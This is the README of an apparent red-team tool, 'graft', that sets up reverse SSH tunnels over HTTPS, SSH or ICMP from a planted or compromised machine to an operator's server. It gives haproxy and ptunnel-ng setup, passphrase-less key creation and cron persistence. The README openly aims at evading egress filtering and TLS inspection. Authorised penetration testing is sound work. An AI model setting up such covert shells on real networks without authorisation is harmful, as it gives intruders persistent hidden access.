# graft.sh
A shell script used to create reverse SSH tunnels through other protocols.
Pull requests will be denied right now. Sorry.

## Purpose
The main purpose of `graft` is to be used on RedTeam and PenTest engagements where you're able to plant a device (or pwn a machine) and want to have shell access on that asset. There are already a lot of Command and Control (C2) utilities which already do a fantastic job but this is meant to provide a shell into an environment and nothing more. 

## Understanding SSH Tunnels
Sometimes it can be difficult to understand how SSH tunnels work. I've put together a quick video here https://www.youtube.com/watch?v=SPDh_1p67lQ which outlines how a basic tunnel works. Watch that (save time and watch at 1.5x speed) and then watch the video I've created about rolling your own C2 (https://www.youtube.com/watch?v=5yIhiEeHSkA) which demonstrates how an SSH reverse tunnel works which is what this `graft` uses as well.

## Why Other Protocols?
You may wonder why we're using other protocols to tunnel with instead of just using SSH. If you're on a RedTeam or PenTest engagement, you may not know the firewall rules in place regarding egress traffic and outbound SSH may be blocked. `graft` will check HTTPS, SSH, ICMP and DNS to the server you specify and if they're able to connect (and verify the connection), `graft` will *piggyback* on those transport protocols. This has the benefit of (somewhat) blending in with *normal* and allowed traffic, circumventing egress filtering as well as UTM features on devices.

## Why not a Different `sshd` Port?
You can run any service on any port so why not just bind `sshd` to TCP/443 and call it a day? Depending on the environment you're in, it's possible that TLS inspection is taking place. If so, the UTM device will see that there's no HTTP verbs being sent and likely drop the traffic. Keep in mind that, for TLS inspection to work, a Certificate Man-in-the-Middle takes place which is important to note for the HTTPS function of `graft`.

---

## How it Works
`graft` is a client-side only application but **requires** server configuration to work. Let's first take a look at the modules and how they operate:

### HTTPS
By using `haproxy` on an Apache server, we're able to tunnel our SSH connection inside the HTTP transport and use that same transport for our reverse shell. The first tunnel is TLS and wrapped in that is the SSH connection to our server. Then, inside that SSH tunnel is the reverse tunnel. Three tunnels for the price of free. What's neat about this is with `haproxy` we will configure rules to detect both HTTP and SSH connections so you can still run a working website on your server.

### SSH
This is just a pure, unadulterated SSH connection outbound with a reverse connection configured. Two tunnels.

### ICMP
This module uses `ptunnel-ng` to send ICMP Echo Request and Reply packets to carry the SSH connection as well as the reverse shell. I wouldn't consider ICMP a tunnel but for the purpose of being a low-level rockstar, I'll say it is. Three tunnels.

### DNS
ToDo

---

## Server Preparation and Configuration
Here is all the information you'll need to configure your tunnels to anchor on your server. For my examples, I'm using Ubuntu 20.04.4LTS.

### HTTPS (Server)
1. Install Apache: 
```sh
apt install apache2
```

2. Create a Let's Encrypt cert:
```sh
snap install core
snap install --classic certbot
/snap/bin/certbot
```
3. Merge your keys to use with `haproxy`:
```sh
mkdir -p /etc/apache2/certs/
cat /etc/certbot/live/YOURSITE/cert.pem /etc/certbot/live/YOURSITE/privkey.pem > /etc/apache2/certs/combo.pem
```
4. Configure Apache to only listen on the loopback address:
```sh
vim /etc/apache2/ports.conf

# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen [::1]:80

<IfModule ssl_module>
        Listen [::1]:443
</IfModule>

<IfModule mod_gnutls.c>
        Listen [::1]:443
</IfModule>
```
5. Disable TLS as it's going to be used by `haproxy`:
```sh
a2dismod ssl
```
6. Restart Apache and verify it's only listening on TCP/80 on the localhost:
```sh
service apache2 restart
netstat -peanut | grep -i list | grep 80
# Should show...
# tcp6       0      0 ::1:80                  :::*                    LISTEN      0          23259      747/apache2
```
7. Install and configure `haproxy`:
```sh
apt install haproxy
vim /etc/haproxy/haproxy.cfg

# Customize at your liking but add the following to the bottom
backend http_tls
	http-request add-header X-Forwarded-Proto http
	mode http
	option forwardfor
	server local_http_server [::1]:80

backend ssh
	mode tcp
	server ssh 127.0.0.1:22
	timeout server 2h

frontend tls
	bind *:443 ssl crt /etc/apache2/certs/combo.pem ssl-min-ver TLSv1.2
	mode tcp
	option tcplog
	tcp-request inspect-delay 5s
	tcp-request content accept if HTTP

	acl client_attempts_ssh payload(0,7) -m bin 5353482d322e30

	use_backend ssh if !HTTP
	use_backend ssh if client_attempts_ssh
	use_backend http_tls if HTTP
```
8. Start `haproxy` and troubleshoot as needed:
```sh
service haproxy start
```
9. Update your `~/.ssh/config` file to support `haproxy`:
```sh
vim ~/.ssh/config
Host YOURSERVER
    ProxyCommand openssl s_client -connect YOURSERVER:443 -quiet 2>/dev/null
```
10. Test both HTTPS (web) and HTTPS (ssh). Open a web page to your site and you should get the default Ubuntu welcome page. Now, SSH to your server and it should connect over HTTPS instead of SSH. You can verify this with:
```sh
tcpdump -nn -vvv -e -s 0 -X -c 100 -i eth0 host YOURSERVER
```
which should show a bunch of TLS/HTTPS traffic and **not** SSH traffic.

### SSH (server)
By default, there are no special requirements for SSH as this is a native connection type.

### ICMP (server)
Using the program `ptunnel-ng` allows us to *piggyback* connections inside of ICMP payloads. Usually, most opertaing systems will send the alphabet and digits as the Echo payloads but with `ptunnel-ng`, the payloads actually contain the protocol we are tunneling. To install `ptunnel-ng`, follow these steps:

1. Create a directory to download it to:
```sh
mkdir -p ~/Downloads/Installers/ptunnel-ng
cd ~/Downloads/Installers/ptunnel-ng
```
2. Clone the repository:
```sh
git clone https://github.com/lnslbrty/ptunnel-ng.git
```
3. Make and install the software:
```sh
./autogen.sh && make install
```
4. Start `ptunnel-ng` and point it at your SSH port running on your server:
```sh
# If SSH is bound to a different port, put it in here.
# This should match the SSHPORT variable in the Client Configuration section below.
ptunnel-ng -R22
```

At this point your server is ready to receive SSH connections over ICMP.

### DNS (server)
ToDo

---

## Client Preparation and Configuration

`graft` has inline variables you can modify near the top of the script itself. They are laid out in sections depending on what module each variable is used in.

### Global
```sh
PREF=(http ssh icmp dns)
```
This is the order in which you'd prefer `graft` to attempt to tunnel. Feel free to move these around but the names mustn't change and must be lower-case.

```sh
SRV=x.x.x.x
```
This is the FQDN or IP of your server on the outside. If you are using a proxy such as `socat`, put that in here.

```sh
USER=jdoe
```
This is the username on the $SRV server you are going to authenticate with.

```sh
RPORT=2232
```
This is the TCP port which will be created on the $SRV server for our Reverse SSH tunnel. Pick something not in use on the $SRV server.

### HTTPS
```sh
HPORT=443
```
The port `haproxy` is listening with on the $SRV server.

```sh
SHA="abcd 1234 abcd 1234 abcd 1234 abcd 1234 abcd 1234"
```
This is the SHA-1 hash of the certificate being presented by $SRV. You can get this with the command: ```nmap $SRV -p 443 --script -ssl-cert | grep SHA``` This will verify that there is no TLS inspection or Man-in-the-Middle attacks taking place.

### SSH
```sh
CFG="$HOME/.ssh/config"
```
The location of the SSH (client) configuration file to read from.

```sh
SSHPORT=22
```
The port that $SRV server has `sshd` listening on.

```sh
SIG="awe54lkws8o7sd4a23w45lhkjasd8dfg4234lkas8as"
```
The SSH $SRV signature to verify that we are connecting to the correct host.

### ICMP
```sh
LPORT=1234
```
This is the port that will be bound to $SRV with `ptunnel-ng` for our Reverse Shell

```sh
LSSHPORT=22
```
This is the port the *client* has bound for `sshd`. This is the box you're running `graft` from.

### Log
```sh
LF="/tmp/graft.log"
```
Where you want to store your logs from `graft`.

### Client Requirements
The following binaries are required to be installed and will be checked for on startup: `openssl`, `hping3`, `ssh`, `ptunnel-ng`
In addition, tools such as `awk` and `grep` are required but not checked for.

### SSH Authentication
To make sure the client device (the one running `graft`) is able to automatically log in to the server, you **must** create an RSA ID for SSH to use where the ID has **no** passphrase. 

1. Create the key:
```sh
ssh-keygen
# When prompted, just press [Enter] for the passphrase
```
2. Copy the SSH ID to the server (method 1):
```sh
ssh-copy-id USER@YOURSERVER -p SSHPORT
```
3. Copy the SSH ID to the server (method 2):
```sh
# On the client
cat ~/.ssh/rsa_id.pub
# Copy this output into your copy buffer (Ctrl+Shft+c)

# On the server
vim ~/.ssh/authorized_keys
# Paste the text from your copy buffer
```

---

## Running
Now that you have both the server and client machines ready, you can run `graft` to create your SSH connections. I would suggest running it manually to test it out first to make sure everything works properly before setting it up in a headless `cron` job.

### Pre-Flight Checklist
- [ ] HTTPS Server configured with `haproxy`
- [ ] TLS Certificate SHA-1 copied to `graft`
- [ ] SSH Server configured
- [ ] SSH fingerprint copied to `graft`
- [ ] ICMP Server configured with `ptunnel-ng`
- [ ] SSH client configured to use `haproxy` in "~/.ssh/config"
- [ ] SSH passphrase-less ID created on client
- [ ] SSH passphrase-less ID stored on server
- [ ] Verified SSH connection from client to server requires no user-interaction for authentication

### Take-Off
Once you have filled in all the variables inside the script itself, `graft` should run everything automatically since it's intended to run headless as a `cron` job. If you run it manually, it will still work and present information to you via STDOUT.

```sh


 _____ _____ _____ _____ _____
|   __| __  |  _  |   __|_   _|
|  |  |    -|     |   __| | |
|_____|__|__|__|__|__|    |_|


       GRAFT: 0.0.1
________________________________


Performing Requirements Checking
--------------------------------
Checking for openssl .......... [OK]
Checking for hping3 ........... [OK]
Checking for ssh .............. [OK]
Checking for ptunnel-ng ....... [OK]
Stopping all "ptunnel-ng" instances ... ptunnel-ng: no process found
Done

Testing Connections
-------------------
HTTPS ... [OK]
Verifying x.x.x.x HTTPS certificate ... [OK]
SSH ..... [OK]
Verifying SSH fingerprint of x.x.x.x ... [OK]
[OK]
ICMP .... [OK]

Entering HTTP Mode
------------------
Checking for proper .ssh/config for x.x.x.x ... grep: /root/.ssh/config: No such file or directory
Not found
Please add the following to your ~/.ssh/config file:

Host x.x.x.x
    ProxyCommand openssl s_client -connect x.x.x.x:443 -quiet 2>/dev/null

Exiting...

Entering ICMP Mode
------------------
Creating ICMP reverse tunnel over ICMP
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
[inf]: Incoming connection.
[evt]: No running proxy thread - starting it.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
Enter passphrase for key '/root/.ssh/id_rsa':
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-94-generic x86_64)
--SNIP--
```

### Process Flow
`graft` is designed to try the four types of tunnel creation in the order set in the `PREF` array but first, `graft` will check to see if the protocol is allowed to egress the network. This is done in the `graft-main()` function. Both HTTP and SSH use the `hping3` tool to send one SYN packet to the server ($SRV) on each respective port ($HPORT and $SSHPORT) to determine if a SYN/ACK is received. If not (the return value [$?] isn't "0"), then that protocol will **not** be used to create a tunnel. If the return value **is** "0" then `graft` will make a connection to the server on the available protocol. In doing so, it will check the SHA-1 hash of the HTTPS/TLS certificate and/or the signature of the SSH server. These will be compared to the values stored in the "SHA" and "SIG" variables respectively. If they don't match, then the protocol is excluded from use as there is likely a Man-in-the-Middle happening. ICMP is tested with a single `ping` to the server.
Once a protocol has been verified for egress, the variable (HTTPC, SSHC, ICMPC and DNSC) will bet set to "0" indicating that they can be used. The `graft-` functions are then called in the order listed in the PREF array and if the "xxxxC" variable is not set to "0", that protocol is skipped and the next one is attempted.
Once the connection is made to the server, `graft` tells SSH to use Reverse Forwarding (`ssh -R...`) to open a socket on the server which, when SSH'd into, will lead back to the client over the same transport protocol used to egress the network.
